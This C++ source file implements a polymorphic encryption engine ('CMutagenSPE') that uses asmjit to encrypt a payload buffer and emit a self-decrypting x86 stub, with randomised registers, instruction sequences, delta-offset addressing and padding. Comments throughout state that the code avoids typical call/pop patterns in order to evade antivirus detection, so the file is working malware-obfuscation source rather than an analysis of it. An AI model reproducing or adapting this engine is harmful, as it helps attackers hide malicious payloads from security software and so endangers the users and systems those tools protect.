#include "bangheera.hpp"
#include <stdio.h>
#include <string.h>

#include "../lib/asmjit/src/asmjit/asmjit.h"



// https://github.com/niosus/EasyClangComplete

// types problem: https://stackoverflow.com/questions/16297073/win32-data-types-equivalant-in-linux


class CMutagenSPE
{
public:
  CMutagenSPE(void);
  ~CMutagenSPE(void);

  // the main function which performs the
  // encryption and generates the polymorphic
  // code
  int PolySPE(PBYTE lpInputBuffer, \
                            DWORD dwInputBuffer, \
                            PBYTE *lpOutputBuffer, \
                            PDWORD lpdwOutputSize);

private:

  // a structure describing the values of
  // the output registers
  typedef struct _SPE_OUTPUT_REGS {

    // target register
    asmjit::GPReg regDst;

    // value to write in this register
    DWORD dwValue;

  } SPE_OUTPUT_REGS, *P_SPE_OUTPUT_REGS;

  // description of an encryption operation
  typedef struct _SPE_CRYPT_OP {

    // TRUE if the operation is performed
    // on two registers; FALSE if it is
    // performed between the target register
    // and the value in dwCryptValue
    BOOL bCryptWithReg;

    asmjit::GPReg regDst;
    asmjit::GPReg regSrc;

    // encryption operation
    BYTE cCryptOp;

    // encryption value
    DWORD dwCryptValue;

  } SPE_CRYPT_OP, *P_SPE_CRYPT_OP;

  enum
  {
    SPE_CRYPT_OP_ADD = 0,
    SPE_CRYPT_OP_SUB = 1,
    SPE_CRYPT_OP_XOR = 2,
    SPE_CRYPT_OP_NOT = 3,
    SPE_CRYPT_OP_NEG = 4,
  };

  // buffer with the encryption operations
  DATA_ITEM diCryptOps;

  // pointer to the table of encryption
  // operations
  P_SPE_CRYPT_OP lpcoCryptOps;

  // count of encryption operations
  DWORD dwCryptOpsCount;

  // pointer to the encrypted data block
  DATA_ITEM diEncryptedData;

  // number of blocks of encrypted data
  DWORD dwEncryptedBlocks;

  // encryption key
  DWORD dwEncryptionKey;

  // asmjit Assembler instance
  Assembler a;

  // the register which will store a pointer
  // to the data which is to be decrypted
  asmjit::GPReg regSrc;

  // the register which will store a pointer
  // to the output buffer
  asmjit::GPReg regDst;

  // the register which hold the size of the
  // encrypted data
  asmjit::GPReg regSize;

  // the register with the encryption key
  asmjit::GPReg regKey;

  // the register on which the decryption
  // instructions will operate
  asmjit::GPReg regData;

  // the preserved registers (ESI EDI EBX in random order)
  asmjit::GPReg regSafe1, regSafe2, regSafe3;

  // the delta_offset label
  Label lblDeltaOffset;

  // the position of the delta offset
  sysint_t posDeltaOffset;

  // the relative address of the encrypted data
  sysint_t posSrcPtr;

  // the size of the unused code between delta
  // offset and the instructions which get that
  // value from the stack
  DWORD dwUnusedCodeSize;

  // helper methods
  void RandomizeRegisters();
  void GeneratePrologue();
  void GenerateDeltaOffset();
  void EncryptInputBuffer(PBYTE lpInputBuffer, \
                          DWORD dwInputBuffer, \
                          DWORD dwMinInstr, \
                          DWORD dwMaxInstr);
  void SetupDecryptionKeys();
  void GenerateDecryption();
  void SetupOutputRegisters(SPE_OUTPUT_REGS *regOutput, \
                            DWORD dwCount);
  void GenerateEpilogue(DWORD dwParamCount);
  void AlignDecryptorBody(DWORD dwAlignment);
  void AppendEncryptedData();
  void UpdateDeltaOffsetAddressing();
};


///////////////////////////////////////////////////////////
//
// random register selection
//
///////////////////////////////////////////////////////////

void CMutagenSPE::RandomizeRegisters()
{
  // set random registers
  asmjit::GPReg cRegsGeneral[] = { eax, ecx, ebx, edx, esi, edi };

  // shuffle the order of registers in the array
  mixup_array(cRegsGeneral, _countof(cRegsGeneral));

  // the register which will contain
  // a pointer to the encrypted data
  regSrc = cRegsGeneral[0];

  // the register which will contain
  // a pointer to the output buffer
  // (supplied as a function parameter)
  regDst = cRegsGeneral[1];

  // the register which will contain
  // the size of the encrypted data buffer
  regSize = cRegsGeneral[2];

  // the register which will contain
  // the decryption key
  regKey = cRegsGeneral[3];

  // the register which will contain
  // the current data value and on which
  // the decryption instructions will operate
  regData = cRegsGeneral[4];

  // set the register whose values will be
  // preserved across function invocations
  asmjit::GPReg cRegsSafe[] = { esi, edi, ebx };

  // shuffle the order of the registers in the array
  mixup_array(cRegsSafe, _countof(cRegsSafe));

  regSafe1 = cRegsSafe[0];
  regSafe2 = cRegsSafe[1];
  regSafe3 = cRegsSafe[2];
}


///////////////////////////////////////////////////////////
//
// generate the prologue of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GeneratePrologue()
{
  // function prologue
  // first the original value of EBP is saved
  // so we can use EBP to refer to the stack frame
  if (rnd_bin() == 0)
  {
    a.push(ebp);
    a.mov(ebp,esp);
  }
  else
  {
    // equivalent to the instructions
    // push ebp
    // mov ebp,esp
    a.enter(imm(0), imm(0));
  }

  // if our function is called using the stdcall
  // convention, and modifies ESI, EDI, or EBX,
  // they must be saved at the beginning of
  // the function and restored at the end
  a.push(regSafe1);
  a.push(regSafe2);
  a.push(regSafe3);

  // load the pointer to the output buffer
  // into our randomly-selected register regDst
  // (this is the only parameter to the function,
  // passed on the stack)
  a.mov(regDst, dword_ptr(ebp, 0x08 + (4 * 0)));
}


///////////////////////////////////////////////////////////
//
// generate delta offset
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateDeltaOffset()
{
  // generate code which will allow us to
  // obtain a pointer to the encrypted data
  // at the end of the decryption function

  // decryption_function:
  // ...
  // call delta_offset
  // mov eax,1 | xor eax,eax ; \
  // leave                   ;  > unused instructions
  // ret 4                   ; /
  // delta_offset:
  // pop regSrc
  // add regSrc, (encrypted_data-delta_offset +
  // ...          + size of the unused instructions)
  // ret 4
  // db 0CCh, 0CCh...
  // encrypted_data:
  // db 0ABh, 0BBh, 083h...

  // create the delta_offset label
  lblDeltaOffset = a.newLabel();

  // generate 'call delta_offset'
  a.call(lblDeltaOffset);

  sysint_t posUnusedCodeStart = a.getOffset();

  // in order to avoid getting flagged by
  // antivirus software, we avoid the typical
  // delta offset construction, i.e. call + pop,
  // by inserting some unused instructions in
  // between, in our case a sequence that looks
  // like the normal code which returns from
  // a function
  if (rnd_bin() == 0)
  {
    a.mov(eax, imm(1));
  }
  else
  {
    a.xor_(eax,eax);
  }

  a.leave();
  a.ret(1 * sizeof(DWORD));

  // calculate the size of the unused code,
  // i.e. the difference between the current
  // position and the beginning of the
  // unused code
  dwUnusedCodeSize = static_cast<DWORD>(a.getOffset() - posUnusedCodeStart);

  // put the label "delta_offset:" here
  a.bind(lblDeltaOffset);

  posDeltaOffset = a.getOffset();

  // instead of the pop instruction, we will
  // use a different method of reading the
  // stack, to avoid rousing the suspicions of
  // antivirus programs

  //a.pop(regSrc);
  a.mov(regSrc, dword_ptr(esp));
  a.add(esp, imm(sizeof(DWORD)));

  // the address of the label "delta_offset:"
  // will now be in the regSrc register;
  // we need to adjust this by the size of
  // the remainder of the function (which we
  // don't know and will have to update later)
  // for now we use the value 987654321 to
  // ensure asmjit generates the long form of
  // the "add" instruction
  a.add(regSrc, imm(987654321));

  // save the position of the previous DWORD
  // so that we can later update it to contain
  // the length of the remainder of the function
  posSrcPtr = a.getOffset() - sizeof(DWORD);
}

///////////////////////////////////////////////////////////
//
// generate the encryption keys, encryption instructions,
// and finally encrypt the input data
//
///////////////////////////////////////////////////////////

void CMutagenSPE::EncryptInputBuffer(PBYTE lpInputBuffer, \
                                     DWORD dwInputBuffer, \
                                     DWORD dwMinInstr, \
                                     DWORD dwMaxInstr)
{
  // generate an encryption key
  dwEncryptionKey = rnd_dword();

  // round up the size of the input buffer
  DWORD dwAlignedSize = align_dword(dwInputBuffer);

  // number of blocks to encrypt
  // divide the size of the input data
  // into blocks of 4 bytes (DWORDs)
  dwEncryptedBlocks = dwAlignedSize / sizeof(DWORD);

  PDWORD lpdwInputBuffer = reinterpret_cast<PDWORD>(lpInputBuffer);

  // allocate memory for the output data
  // (the size will be rounded to the
  // block size)
  di_valloc(&diEncryptedData, dwAlignedSize);

  PDWORD lpdwOutputBuffer = reinterpret_cast<PDWORD>(diEncryptedData.lpPtr);

  // randomly select the number of encryption instructions
  dwCryptOpsCount = rnd_range(dwMinInstr, dwMaxInstr);

  // allocate memory for an array which will
  // record information about the sequence of
  // encryption instructions
  di_valloc(&diCryptOps, dwCryptOpsCount * sizeof(SPE_CRYPT_OP));

  // set up a direct pointer to this table
  // in a helper variable
  lpcoCryptOps = reinterpret_cast<P_SPE_CRYPT_OP>(diCryptOps.lpPtr);

  // generate encryption instructions and their type
  for (DWORD i = 0; i < dwCryptOpsCount; i++)
  {
    // will the instruction perform an operation
    // combining regData and regKey?
    lpcoCryptOps[i].bCryptWithReg = rnd_bool();

    // the register we are operating on
    lpcoCryptOps[i].regDst = regData;

    // if the instruction doesn't use the regKey
    // register, generate a random key which
    // will be used in the operation
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
    {
      lpcoCryptOps[i].dwCryptValue = rnd_dword();
    }
    else
    {
      lpcoCryptOps[i].regSrc = regKey;
    }

    // randomly choose the type of encryption instruction
    lpcoCryptOps[i].cCryptOp = static_cast<BYTE>(rnd_range(SPE_CRYPT_OP_ADD, SPE_CRYPT_OP_NEG));
  }

  // encrypt the input data according to the
  // instructions we have just generated
  for (DWORD i = 0, dwInitialEncryptionKey = dwEncryptionKey; i < dwEncryptedBlocks; i++)
  {
    // take the next block for encryption
    DWORD dwInputBlock = lpdwInputBuffer[i];

    // encryption loop: executes the sequence of
    // encryption instructions on the data block
    for (DWORD j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
    {
      if (lpcoCryptOps[j].bCryptWithReg == FALSE)
      {
        dwCurrentEncryptionKey = lpcoCryptOps[j].dwCryptValue;
      }
      else
      {
        dwCurrentEncryptionKey = dwInitialEncryptionKey;
      }

      // depending on the encryption operation,
      // perform the appropriate modification
      // of the data block
      switch(lpcoCryptOps[j].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        dwInputBlock += dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_SUB:
        dwInputBlock -= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_XOR:
        dwInputBlock ^= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_NOT:
        dwInputBlock = ~dwInputBlock;
        break;
      case SPE_CRYPT_OP_NEG:
        dwInputBlock = 0L - dwInputBlock;
        break;
      }
    }

    // store the encrypted block in the buffer
    lpdwOutputBuffer[i] = dwInputBlock;
  }
}


///////////////////////////////////////////////////////////
//
// set up the keys which will be used to decrypt the data
//
///////////////////////////////////////////////////////////

void CMutagenSPE::SetupDecryptionKeys()
{
  // set up a decryption key in the regKey
  // register, which will itself be encrypted
  DWORD dwKeyModifier = rnd_dword();

  // randomly generate instructions to set up
  // the decryption key
  switch(rnd_max(2))
  {
  // mov regKey,dwKey - dwMod
  // add regKey,dwMod
  case 0:
    a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
    a.add(regKey, imm(dwKeyModifier));
    break;

  // mov regKey,dwKey + dwMod
  // sub regKey,dwMod
  case 1:
    a.mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
    a.sub(regKey, imm(dwKeyModifier));
    break;

  // mov regKey,dwKey ^ dwMod
  // xor regKey,dwMod
  case 2:
    a.mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
    a.xor_(regKey, imm(dwKeyModifier));
    break;
  }
}


///////////////////////////////////////////////////////////
//
// generate the decryption code (for the main decryption loop)
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateDecryption()
{
  // set up the size of the encrypted data
  // (in blocks)
  a.mov(regSize, imm(dwEncryptedBlocks));

  // create a label for the start of the
  // decryption loop
  Label lblDecryptionLoop = a.newLabel();

  a.bind(lblDecryptionLoop);

  // read the data referred to by the
  // regSrc register
  a.mov(regData, dword_ptr(regSrc));

  // build the decryption code by generating each
  // decryption instruction in turn (reversing the
  // order and the operations that were used for
  // encryption!)
  for (DWORD i = dwCryptOpsCount - 1; i != -1L; i--)
  {
    // encryption was done either with the key
    // in register regKey, or a constant value,
    // so depending on this we need to generate
    // the appropriate decryption instructions
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
    {
      DWORD dwDecryptionKey = lpcoCryptOps[i].dwCryptValue;

      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
    else
    {
      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
  }

  // write the decrypted block to the output
  // buffer
  a.mov(dword_ptr(regDst), regData);

  // update the pointers to the input and ouput
  // buffers to point to the next block
  a.add(regSrc, imm(sizeof(DWORD)));
  a.add(regDst, imm(sizeof(DWORD)));

  // decrement the loop counter (the number of
  // blocks remaining to decrypt)
  a.dec(regSize);

  // check if the loop is finished
  // if not, jump to the start
  a.jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void CMutagenSPE::SetupOutputRegisters(SPE_OUTPUT_REGS *regOutput, DWORD dwCount)
{
  // if there are no output registers to
  // set up, return
  if ((regOutput == NULL) || (dwCount == 0))
  {
    return;
  }

  // shuffle the order in which the registers
  // will be set up
  mixup_array(regOutput, dwCount);

  // generate instructions to set up the
  // output registers
  // mov r32, imm32
  for (DWORD i = 0; i < dwCount; i++)
  {
    a.mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
  }
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateEpilogue(DWORD dwParamCount)
{
  // restore the original values of
  // registers ESI EDI EBX
  a.pop(regSafe3);
  a.pop(regSafe2);
  a.pop(regSafe1);

  // restore the value of EBP
  if (rnd_bin() == 0)
  {
    a.leave();
  }
  else
  {
    // equivalent to "leave"
    a.mov(esp,ebp);
    a.pop(ebp);
  }

  // return to the code which called
  // our function; additionally adjust
  // the stack by the size of the passed
  // parameters (by stdcall convention)
  a.ret(imm(dwParamCount * sizeof(DWORD)));
}


///////////////////////////////////////////////////////////
//
// align the size of the decryption function
// to the specified granularity
//
///////////////////////////////////////////////////////////

void CMutagenSPE::AlignDecryptorBody(DWORD dwAlignment)
{
  // take the current size of the code
  DWORD dwCurrentSize = a.getCodeSize();

  // find the number of bytes that would
  // align the size to a multiple of the
  // supplied size (e.g. 4)
  DWORD dwAlignmentSize = align_bytes(dwCurrentSize, dwAlignment) - dwCurrentSize;

  // check if any alignment is required
  if (dwAlignmentSize == 0)
  {
    return;
  }

  // add padding instructions (int3 or nop)
  if (rnd_bin() == 0)
  {
    while (dwAlignmentSize--) a.int3();
  }
  else
  {
    while (dwAlignmentSize--) a.nop();
  }
}


///////////////////////////////////////////////////////////
//
// correct all instructions making use of
// addressing relative to the delta offset
//
///////////////////////////////////////////////////////////

void CMutagenSPE::UpdateDeltaOffsetAddressing()
{
  DWORD dwAdjustSize = static_cast<DWORD>(a.getOffset() - posDeltaOffset);

  // correct the instruction which sets up
  // a pointer to the encrypted data block
  // at the end of the decryption function
  //
  // this pointer is loaded into the regSrc
  // register, and must be updated by the
  // size of the remainder of the function
  // after the delta_offset label
  a.setDWordAt(posSrcPtr, dwAdjustSize + dwUnusedCodeSize);
}


///////////////////////////////////////////////////////////
//
// append the encrypted data to the end of the code
// of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::AppendEncryptedData()
{
  PDWORD lpdwEncryptedData = reinterpret_cast<PDWORD>(diEncryptedData.lpPtr);

  // place the encrypted data buffer
  // at the end of the decryption function
  // (in 4-byte blocks)
  for (DWORD i = 0; i < dwEncryptedBlocks; i++)
  {
    a._emitDWord(lpdwEncryptedData[i]);
  }
}


///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

int CMutagenSPE::PolySPE(PBYTE lpInputBuffer, \
                                       DWORD dwInputBuffer, \
                                       PBYTE *lpOutputBuffer, \
                                       PDWORD lpdwOutputSize)
{
  ///////////////////////////////////////////////////////////
  //
  // check input parameters
  //
  ///////////////////////////////////////////////////////////

  if ( (lpInputBuffer == NULL) || (dwInputBuffer == 0) || \
       (lpOutputBuffer == NULL) || (lpdwOutputSize == NULL) )
  {
    return MUTAGEN_ERR_PARAMS;
  }

  // randomly select registers
  RandomizeRegisters();

  ///////////////////////////////////////////////////////////
  //
  // generate polymorphic function code
  //
  ///////////////////////////////////////////////////////////

  // generate function prologue
  GeneratePrologue();

  // set up relative addressing through the delta offset technique
  GenerateDeltaOffset();

  // encrypt the input data, generate encryption keys. the additional parameters set the lower and upper limits on the 
  // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
  // numbers in the thousands, but be aware that this will make the output code quite large)
  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 3, 5);

  // generate code to set up keys for decryption
  SetupDecryptionKeys();

  // generate decryption code
  GenerateDecryption();

  // set up the values of the output registers
  SPE_OUTPUT_REGS regOutput[] = { { eax, dwInputBuffer } };
  SetupOutputRegisters(regOutput, _countof(regOutput));

  // generate function epilogue
  GenerateEpilogue(1L);

  // align the size of the function to a multiple
  // of 4 or 16
  AlignDecryptorBody(rnd_bin() == 0 ? 4L : 16L);

  // fix up any instructions that use delta offset addressing
  UpdateDeltaOffsetAddressing();

  // place the encrypted data at the end of the function
  AppendEncryptedData();

  ///////////////////////////////////////////////////////////
  //
  // free resources
  //
  ///////////////////////////////////////////////////////////

  // free the encrypted data buffer
  di_vfree(&diEncryptedData);

  // free the array of encryption pseudoinstructions
  di_vfree(&diCryptOps);

  ///////////////////////////////////////////////////////////
  //
  // copy the polymorphic code to the output buffer
  //
  ///////////////////////////////////////////////////////////

  DWORD dwOutputSize = a.getCodeSize();

  // assemble the code of the polymorphic function (this resolves jumps and labels)
  PVOID lpPolymorphicCode = a.make();

  // this struct describes the allocated memory block
  DATA_ITEM diOutput;

  // allocate memory (with execute permissions) for the output buffer
  di_valloc(&diOutput, dwOutputSize);

  // check that allocation was successful
  if (diOutput.lpPtr != NULL)
  {
    // copy the generated code of the decryption function
    memcpy(diOutput.lpPtr, lpPolymorphicCode, dwOutputSize);

    // provide the output buffer and code size to
    // this function's caller
    *lpOutputBuffer = diOutput.lpPtr;
    *lpdwOutputSize = dwOutputSize;

    MemoryManager::getGlobal()->free(lpPolymorphicCode);
  }
  else
  {
    MemoryManager::getGlobal()->free(lpPolymorphicCode);

    return MUTAGEN_ERR_MEMORY;
  }

  ///////////////////////////////////////////////////////////
  //
  // function exit
  //
  ///////////////////////////////////////////////////////////

  return MUTAGEN_ERR_SUCCESS;
}
